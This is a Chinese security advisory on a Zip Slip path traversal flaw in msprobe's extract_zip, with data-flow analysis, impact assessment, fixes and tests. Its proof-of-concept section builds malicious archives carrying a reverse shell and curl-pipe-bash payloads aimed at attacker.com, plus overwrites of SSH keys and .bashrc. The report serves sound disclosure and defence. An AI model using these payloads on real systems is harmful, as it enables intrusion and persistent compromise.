# VUL-CORE-001: Zip Slip Path Traversal Vulnerability

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VUL-CORE-001 |
| **类型** | Zip Slip (路径遍历) |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **严重性** | HIGH |
| **置信度** | 85% → CONFIRMED |
| **文件** | `python/msprobe/core/common/file_utils.py` |
| **行号** | 943-966 |
| **函数** | `extract_zip` |
| **模块** | msprobe.core |

### 简要描述

`extract_zip()` 函数使用 `zipfile.extractall()` 解压 ZIP 文件时，未对 ZIP 内条目的路径进行安全校验。攻击者可通过在 ZIP 文件条目名称中嵌入 `../` 等路径遍历字符，将文件写入目标解压目录之外的任意位置，实现任意文件写入。

---

## 技术分析

### 漏洞代码片段

**文件**: `python/msprobe/core/common/file_utils.py` (行 943-966)

```python
def extract_zip(zip_file_path, extract_dir):
    """
    Extract the contents of a ZIP archive to a specified directory.

    :param zip_file_path: Path to the ZIP archive
    :param extract_dir: Directory to extract the contents to
    """
    check_file_suffix(zip_file_path, FileCheckConst.ZIP_SUFFIX)
    check_file_or_directory_path(zip_file_path)
    create_directory(extract_dir)
    try:
        proc_lock.acquire()
        check_zip_file(zip_file_path)  # ← 仅检查文件数量和大小，未检查路径安全
    except Exception as e:
        logger.error(f'Save content to file "{os.path.basename(zip_file_path)}" failed.')
        raise RuntimeError(f"Save content to file {os.path.basename(zip_file_path)} failed.") from e
    finally:
        proc_lock.release()
    try:
        with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
            zip_file.extractall(extract_dir)  # ← 漏洞点：无路径验证
    except Exception as e:
        raise RuntimeError(f"extract zip file {os.path.basename(zip_file_path)} failed") from e
    recursive_chmod(extract_dir)
```

### `check_zip_file()` 函数分析

**文件**: `python/msprobe/core/common/file_utils.py` (行 824-836)

```python
def check_zip_file(zip_file_path):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
        total_size = 0
        if len(zip_file.infolist()) > FileCheckConst.MAX_FILE_IN_ZIP_SIZE:
            raise ValueError(f"Too many files in {os.path.basename(zip_file_path)}")
        for file_info in zip_file.infolist():
            if file_info.file_size > FileCheckConst.MAX_FILE_SIZE:
                raise ValueError(f"File {file_info.filename} is too large to extract")
            total_size += file_info.file_size
            if total_size > FileCheckConst.MAX_ZIP_SIZE:
                raise ValueError(f"Total extracted size exceeds the limit...")
```

**关键发现**: `check_zip_file()` 仅校验：
- 文件数量上限 (`MAX_FILE_IN_ZIP_SIZE = 1GB`)
- 单文件大小上限 (`MAX_FILE_SIZE = 1GB`)
- 总解压大小上限 (`MAX_ZIP_SIZE = 10GB`)

**缺失的安全校验**:
- ❌ 未检查条目路径是否包含 `../` 路径遍历字符
- ❌ 未检查条目路径是否为绝对路径（以 `/` 开头）
- ❌ 未验证最终写入路径是否在目标目录范围内

### 完整数据流路径

```
┌─────────────────────────────────────────────────────────────────────┐
│                         攻击入口点                                   │
├─────────────────────────────────────────────────────────────────────┤
│ CLI 参数: msprobe config_check -c <bench.zip> <cmp.zip>             │
│                                                                      │
│ 用户完全控制 bench_zip_path 和 cmp_zip_path 参数                    │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│ config_check_cli.py:26-27                                           │
├─────────────────────────────────────────────────────────────────────┤
│ def compare(bench_zip_path, cmp_zip_path, output_path):             │
│     ConfigChecker.compare(bench_zip_path, cmp_zip_path, output_path)│
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│ config_checker.py:46-54 (ConfigChecker.compare)                     │
├─────────────────────────────────────────────────────────────────────┤
│ @staticmethod                                                        │
│ def compare(bench_zip_path, cmp_zip_path, output_path):             │
│     create_directory(output_path)                                   │
│     bench_dir = os.path.join(output_path, "bench")                  │
│     cmp_dir = os.path.join(output_path, "cmp")                      │
│     extract_zip(bench_zip_path, bench_dir)  # ← 第一次调用          │
│     extract_zip(cmp_zip_path, cmp_dir)       # ← 第二次调用         │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│ file_utils.py:943-966 (extract_zip)                                 │
├─────────────────────────────────────────────────────────────────────┤
│ def extract_zip(zip_file_path, extract_dir):                        │
│     ...                                                              │
│     check_zip_file(zip_file_path)  # ← 仅校验大小，未校验路径       │
│     ...                                                              │
│     with zipfile.ZipFile(zip_file_path, 'r') as zip_file:           │
│         zip_file.extractall(extract_dir)  # ← 漏洞触发点            │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│                         漏洞结果                                     │
├─────────────────────────────────────────────────────────────────────┤
│ ZIP 条目: "../../../tmp/malicious.py"                               │
│ 写入位置: /tmp/malicious.py (而非 extract_dir 内)                   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 攻击场景与 PoC

### 攻击场景 1: 任意文件写入

**前提条件**:
- 用户在训练服务器上运行 `msprobe config_check -c` 命令比对配置
- 攻击者能够提供恶意构造的 ZIP 文件（通过网络传输、共享存储等途径）

**攻击步骤**:

1. 攻击者构造恶意 ZIP 文件，包含路径遍历条目：

```python
# poc_create_malicious_zip.py
import zipfile

def create_malicious_zip(output_path):
    with zipfile.ZipFile(output_path, 'w') as zf:
        # 正常文件（用于迷惑用户）
        zf.writestr("config/env.json", '{"ENV": "normal"}')
        
        # 恶意条目：写入上级目录
        zf.writestr("../malicious.py", '''
import os
import subprocess
# 植入的后门代码
subprocess.run(["/bin/bash", "-c", "curl attacker.com/shell.sh | bash"])
''')
        
        # 更深层的路径遍历
        zf.writestr("../../../../tmp/backdoor.sh", '''
#!/bin/bash
# 反向 shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1
''')

create_malicious_zip("bench_malicious.zip")
```

2. 用户执行比对命令：

```bash
# 用户从攻击者处获取 bench_malicious.zip
msprobe config_check -c bench_malicious.zip cmp_normal.zip -o /home/user/config_check_result
```

3. 漏洞触发：

```
解压目录: /home/user/config_check_result/bench
条目 "../../../malicious.py" 写入到:
  → /home/user/malicious.py

条目 "../../../../../../tmp/backdoor.sh" 写入到:
  → /tmp/backdoor.sh
```

### 攻击场景 2: 配置文件替换

**攻击目标**: 替换用户的 `.bashrc`、`.ssh/authorized_keys` 或其他敏感配置文件

```python
# 替换 SSH authorized_keys
zf.writestr("../../../../.ssh/authorized_keys", "ssh-rsa AAAAB3... attacker_key")

# 替换 bashrc 添加持久化后门
zf.writestr("../../../../.bashrc", '''
# Original content preserved...
curl attacker.com/persist.sh | bash &
''')
```

### PoC 验证脚本

```python
#!/usr/bin/env python3
"""
PoC: Zip Slip Vulnerability in msprobe extract_zip()
验证路径遍历可写入解压目录之外的文件
"""

import zipfile
import os
import tempfile
import shutil

def create_malicious_zip(zip_path):
    """创建包含路径遍历条目的恶意 ZIP"""
    with zipfile.ZipFile(zip_path, 'w') as zf:
        # 正常文件
        zf.writestr("env.json", '{"test": "normal"}')
        
        # 路径遍历文件
        zf.writestr("../escaped_file.txt", "This file escaped the extraction directory!")
        zf.writestr("../../../../../../tmp/poc_marker.txt", "Zip Slip PoC successful")

def verify_exploit(zip_path, extract_dir):
    """验证漏洞效果"""
    print(f"[*] Creating malicious zip: {zip_path}")
    create_malicious_zip(zip_path)
    
    print(f"[*] Target extraction directory: {extract_dir}")
    
    # 模拟 extract_zip 行为
    with zipfile.ZipFile(zip_path, 'r') as zf:
        zf.extractall(extract_dir)
    
    # 检查文件是否逃逸
    escaped_file = os.path.join(os.path.dirname(extract_dir), "escaped_file.txt")
    tmp_marker = "/tmp/poc_marker.txt"
    
    results = []
    if os.path.exists(escaped_file):
        results.append(f"[!] VULNERABILITY CONFIRMED: {escaped_file} created outside extract_dir")
        results.append(f"    Content: {open(escaped_file).read()}")
    
    if os.path.exists(tmp_marker):
        results.append(f"[!] VULNERABILITY CONFIRMED: {tmp_marker} created")
        results.append(f"    Content: {open(tmp_marker).read()}")
    
    # 清理
    if os.path.exists(escaped_file):
        os.remove(escaped_file)
    if os.path.exists(tmp_marker):
        os.remove(tmp_marker)
    
    return results

if __name__ == "__main__":
    with tempfile.TemporaryDirectory() as tmpdir:
        zip_path = os.path.join(tmpdir, "test.zip")
        extract_dir = os.path.join(tmpdir, "extract_target")
        os.makedirs(extract_dir)
        
        results = verify_exploit(zip_path, extract_dir)
        for r in results:
            print(r)
        
        if not results:
            print("[*] No files escaped - vulnerability may not be present")
```

**预期输出**:
```
[!] VULNERABILITY CONFIRMED: /tmp/tmpXXX/escaped_file.txt created outside extract_dir
    Content: This file escaped the extraction directory!
[!] VULNERABILITY CONFIRMED: /tmp/poc_marker.txt created
    Content: Zip Slip PoC successful
```

---

## 影响评估

### 高风险写入位置

| 目标路径 | 潜在影响 |
|----------|----------|
| `~/.ssh/authorized_keys` | SSH 后门植入，远程登录 |
| `~/.bashrc`, `~/.profile` | 用户登录时执行恶意代码 |
| `/etc/cron.d/` | 系统级定时任务（需 root 权限） |
| `/tmp/` | 临时文件写入，可被其他进程读取执行 |
| `/home/user/workspace/` | 源代码污染，引入恶意依赖 |
| `./train.py` | 训练脚本篡改，影响模型精度或植入恶意逻辑 |

### 权限提升可能性

| 条件 | 提升潜力 |
|------|----------|
| msprobe 以普通用户运行 | 可写入用户可写目录，覆盖用户配置 |
| msprobe 以 root 运行 | **CRITICAL**: 可写入任意系统文件，完全系统控制 |
| 多用户共享环境 | 可写入其他用户的工作目录，横向移动 |

### 攻击链扩展

1. **初始访问**: 通过恶意 ZIP 文件获得文件写入能力
2. **持久化**: 写入 `.bashrc` 或 cron 任务
3. **权限提升**: 覆盖 sudo 配置或写入 SUID 程序目录
4. **横向移动**: 在共享存储环境写入其他用户目录

### 真实攻击场景

**AI 训练环境攻击**:
- 攻击者通过模型共享平台分发包含恶意 ZIP 的训练配置包
- 用户使用 msprobe 比对配置时触发漏洞
- 恶意代码被写入训练服务器，可能导致：
  - 训练数据窃取
  - 模型权重篡改
  - 训练中断或精度下降
  - GPU 资源滥用

---

## 修复建议

### 方案 1: 路径安全验证（推荐）

```python
import os

def extract_zip_safe(zip_file_path, extract_dir):
    """
    安全解压 ZIP 文件，防止路径遍历攻击
    """
    check_file_suffix(zip_file_path, FileCheckConst.ZIP_SUFFIX)
    check_file_or_directory_path(zip_file_path)
    
    # 规范化目标目录路径
    extract_dir = os.path.realpath(extract_dir)
    create_directory(extract_dir)
    
    try:
        proc_lock.acquire()
        with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
            for member in zip_file.infolist():
                # 安全校验：验证每个条目的最终路径
                member_path = os.path.realpath(os.path.join(extract_dir, member.filename))
                
                # 检查路径是否在目标目录范围内
                if not member_path.startswith(extract_dir + os.sep):
                    raise ValueError(
                        f"Path traversal detected: '{member.filename}' attempts to write "
                        f"outside extraction directory"
                    )
                
                # 检查绝对路径（防止 /etc/passwd 等）
                if os.path.isabs(member.filename):
                    raise ValueError(
                        f"Absolute path not allowed: '{member.filename}'"
                    )
                
                # 执行解压
                zip_file.extract(member, extract_dir)
    except Exception as e:
        raise RuntimeError(f"extract zip file {os.path.basename(zip_file_path)} failed") from e
    finally:
        proc_lock.release()
    
    recursive_chmod(extract_dir)
```

### 方案 2: 使用安全的解压库

使用已修复此漏洞的第三方库：

```python
# 使用 tarfile 的 filter 参数（Python 3.12+）
import tarfile

def extract_tar_safe(tar_path, extract_dir):
    with tarfile.open(tar_path) as tf:
        tf.extractall(extract_dir, filter='data')  # 自动拒绝路径遍历

# 或使用 zipfile 的替代方案
from zipfile import ZipFile
import pathlib

def safe_extract(zip_path, dest_dir):
    dest = pathlib.Path(dest_dir).resolve()
    with ZipFile(zip_path) as zf:
        for member in zf.namelist():
            member_path = pathlib.Path(dest / member).resolve()
            if not str(member_path).startswith(str(dest)):
                raise ValueError(f"Unsafe path: {member}")
            zf.extract(member, dest_dir)
```

### 方案 3: 白名单校验

```python
ALLOWED_EXTENSIONS = {'.json', '.yaml', '.yml', '.csv', '.xlsx', '.txt', '.log'}

def extract_zip_whitelist(zip_file_path, extract_dir):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
        for member in zip_file.infolist():
            # 检查扩展名
            ext = os.path.splitext(member.filename)[1].lower()
            if ext not in ALLOWED_EXTENSIONS:
                raise ValueError(f"Disallowed file type: {member.filename}")
            
            # 检查路径字符
            if '..' in member.filename or member.filename.startswith('/'):
                raise ValueError(f"Unsafe path: {member.filename}")
            
            zip_file.extract(member, extract_dir)
```

### 修复优先级

| 修复项 | 优先级 | 工作量 |
|--------|--------|--------|
| 添加路径遍历检测 | **P0** (立即) | 低 |
| 禁用绝对路径条目 | **P0** (立即) | 低 |
| 更新 `check_zip_file()` | **P1** (本周) | 中 |
| 添加单元测试验证 | **P1** (本周) | 中 |
| 安全审计文档更新 | **P2** (下周) | 低 |

### 测试用例建议

```python
import pytest
import zipfile
import tempfile
import os

class TestExtractZipSecurity:
    def test_path_traversal_blocked(self):
        """路径遍历攻击应被阻止"""
        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = os.path.join(tmpdir, "evil.zip")
            extract_dir = os.path.join(tmpdir, "safe_dir")
            os.makedirs(extract_dir)
            
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr("../escaped.txt", "evil content")
            
            with pytest.raises(ValueError, match="Path traversal"):
                extract_zip(zip_path, extract_dir)
            
            assert not os.path.exists(os.path.join(tmpdir, "escaped.txt"))
    
    def test_absolute_path_blocked(self):
        """绝对路径条目应被阻止"""
        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = os.path.join(tmpdir, "evil.zip")
            extract_dir = os.path.join(tmpdir, "safe_dir")
            
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr("/etc/passwd", "evil content")
            
            with pytest.raises(ValueError, match="Absolute path"):
                extract_zip(zip_path, extract_dir)
    
    def test_normal_extraction_works(self):
        """正常 ZIP 应能正确解压"""
        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = os.path.join(tmpdir, "normal.zip")
            extract_dir = os.path.join(tmpdir, "safe_dir")
            
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr("config.json", '{"normal": true}')
                zf.writestr("subdir/data.csv", "col1,col2\nval1,val2")
            
            extract_zip(zip_path, extract_dir)
            
            assert os.path.exists(os.path.join(extract_dir, "config.json"))
            assert os.path.exists(os.path.join(extract_dir, "subdir", "data.csv"))
```

---

## 参考资料

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Snyk: Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability/)
- [Python zipfile Security Considerations](https://docs.python.org/3/library/zipfile.html#extracting-archives)

---

## 总结

| 维度 | 评估 |
|------|------|
| **漏洞类型** | 经典 Zip Slip 路径遍历 |
| **攻击复杂度** | 低（仅需构造恶意 ZIP） |
| **影响范围** | 高（可写入任意用户可写位置） |
| **修复难度** | 低（添加路径校验即可） |
| **现实威胁** | 中高（AI 训练环境配置比对场景真实存在） |

**建议**: 立即修复此漏洞，在 `extract_zip()` 中添加路径安全验证，防止路径遍历攻击。修复后需添加安全测试用例确保后续版本不会重新引入漏洞。